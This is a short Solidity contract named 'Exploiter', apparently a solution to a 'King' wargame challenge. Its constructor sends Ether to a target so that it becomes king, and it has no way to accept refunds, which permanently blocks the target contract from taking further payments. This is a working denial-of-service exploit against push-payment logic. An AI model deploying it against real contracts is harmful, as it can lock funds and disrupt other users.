pragma solidity ^0.8.17;


contract Exploiter {
    constructor(address payable to) payable {
        (bool success, ) = address(to).call{value: msg.value}("");
        require(success, "we are not the new king");
    }
}